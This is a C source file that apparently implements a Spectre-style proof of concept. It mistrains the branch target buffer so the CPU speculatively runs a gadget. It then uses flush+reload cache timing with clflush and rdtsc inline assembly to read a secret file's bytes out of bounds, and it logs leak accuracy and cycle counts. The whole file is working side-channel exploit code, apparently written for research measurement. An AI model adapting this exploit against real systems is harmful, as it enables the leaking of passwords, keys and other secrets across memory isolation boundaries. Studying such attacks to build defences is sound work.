#include <stdio.h>
#include <x86intrin.h>
#include <unistd.h>
#define _GNU_SOURCE
#include <sched.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#define TARGET_ARRAY_LENGTH 256
#define ELEMENT_DISTANCE 512
#define CACHE_LINE_SIZE 64
#define BYTES_TO_BE_READ 10000
#define READ_ITERATIONS 3

void victim_call(uint64_t index, void* target_array);
void victim_func();
void vulnerable_instruction();

uint8_t x[150];
char my_secret[10001];
uint64_t bounds[16 * sizeof(uint64_t)];
void* victim_func_addr = vulnerable_instruction;

void shuffle_array(size_t array[]){
    srand(time(NULL));
    for(int i = TARGET_ARRAY_LENGTH - 1; i > 0; i--){
        size_t random_index = rand() % (i + 1);
        size_t tmp = array[random_index];
        array[random_index] = array[i];
        array[i] = tmp;
    }
    return;
}

void flush_array(void *array_to_flush){
    void* addr_ptr = array_to_flush;
    for(int i = 0; i < TARGET_ARRAY_LENGTH; i++){
        _mm_clflush(addr_ptr);
        addr_ptr += ELEMENT_DISTANCE;
    }
    return;
}

void reload_array(void *array_to_reload, char *extracted_char){
    size_t indices[TARGET_ARRAY_LENGTH];
    for(size_t i = 0; i < TARGET_ARRAY_LENGTH; i++){
        indices[i] = i;
    }
    shuffle_array(indices);
    uint64_t results[TARGET_ARRAY_LENGTH];
    void* addr_ptr;
    size_t current_index;
    for(int i = 0; i < TARGET_ARRAY_LENGTH; i++){
        current_index = indices[i];
        addr_ptr = array_to_reload + current_index * ELEMENT_DISTANCE;
        uint64_t reload_time;
        asm (
            "mfence \n"
            "lfence \n"
            "rdtsc \n" 
            "lfence \n"
            "mov %%rax, %%rsi \n"
            "mov (%1), %%al \n"
            "lfence \n"
            "rdtsc \n"
            "sub %%rsi, %%rax\n"
            : "=a" (reload_time)
            : "c" (addr_ptr)
        );
        results[current_index] = reload_time;
    }
    size_t lowest_timing = 1;
    for(int i = 1; i < TARGET_ARRAY_LENGTH; i++){
        //printf("Cycles taken for %i: %li\n", i, results[i]);
        //fprintf(result_ptr, "%li %i\n", results[i], i);
        if(results[i] < results[lowest_timing]){
            lowest_timing = i;
        }
    }
    *extracted_char = (char)lowest_timing;
    return;
}

double calculate_accuracy(char *original_bytes, char *extracted_bytes){
    int hits = 0;
    size_t miss_indices[10000] = {0};
    for(int i = 0; i < BYTES_TO_BE_READ; i++){
        if(original_bytes[i] == extracted_bytes[i]){
            hits++;
        }else{
            miss_indices[i-hits] = i;
        }
    }
    double accuracy = ((float)hits / BYTES_TO_BE_READ) * 100;
    /* printf("------ MISS INDICES: ------\n");
    for(int i = 0; i < 200; i++){
        if(miss_indices[i] != 0){
            printf("%li: Actual Byte: %x Extracted Byte: %x\n", miss_indices[i], (uint8_t)original_bytes[miss_indices[i]], (uint8_t)extracted_bytes[miss_indices[i]]);
        }
    } 
    printf("\n\n");  */
    return accuracy;
}

int main(int argc, char* argv[]){
    FILE *secret_text = fopen("../secret.txt", "r");
    int secret_offset = (void*)&my_secret[0] - (void*)&x[0];
    //printf("Offset: %i\n", secret_offset);
    char extracted_string_buffer[10001];
    extracted_string_buffer[10000] = 0x00;
    uint64_t isolation[16];
    uint8_t huge_array[TARGET_ARRAY_LENGTH * ELEMENT_DISTANCE];
    uint64_t trash[16];
    void* target_array = &huge_array;
    fgets(my_secret, 10001, secret_text);
    bounds[0] = 150;
    struct timespec begin, end;
    uint64_t cycles_sum = 0;
    unsigned int rdtscp_trash;
    unsigned long long begin_flrl_window;
    unsigned long long end_flrl_window;
    
    clock_gettime(CLOCK_MONOTONIC, &begin);
    for(int i = 0; i < BYTES_TO_BE_READ; i++){ 
        // Mistrain BTB by repeated calls of the vulnerable instruction
        victim_func_addr = vulnerable_instruction;
        for(int j = 0; j < 10; j++){
            victim_call(0, target_array);
        }
        victim_func_addr = victim_func;     // Change to valid address, CPU will misspeculate to gadget address
        _mm_clflush(victim_func_addr);
        begin_flrl_window = __rdtscp(&rdtscp_trash);   // Calculate Cycles taken between flush and reload
        flush_array(target_array);  // Prepare array
        victim_call(secret_offset + i, target_array); // Call with invalid index
        reload_array(target_array, &extracted_string_buffer[i]);
        end_flrl_window = __rdtscp(&rdtscp_trash);
        cycles_sum += end_flrl_window - begin_flrl_window;
    } 
    clock_gettime(CLOCK_MONOTONIC, &end);
    double time_spent = (end.tv_sec - begin.tv_sec) + (end.tv_nsec - begin.tv_nsec) / 1e9;
    double spectre_accuracy = calculate_accuracy(&my_secret[0], &extracted_string_buffer[0]);
    double cycles_taken_average = (float)cycles_sum / BYTES_TO_BE_READ;

    //printf("Extracted String is: %s\n\nSpectre accuracy was: %f %%\n", &extracted_string_buffer[0], spectre_accuracy);
    printf("Spectre accuracy was: %f %%\n", spectre_accuracy);
    FILE *evaluation_file = fopen("../output/evaluation.txt", "a");
    fprintf(evaluation_file, "%f %f %f\n", spectre_accuracy, time_spent, cycles_taken_average);
    return 0;
}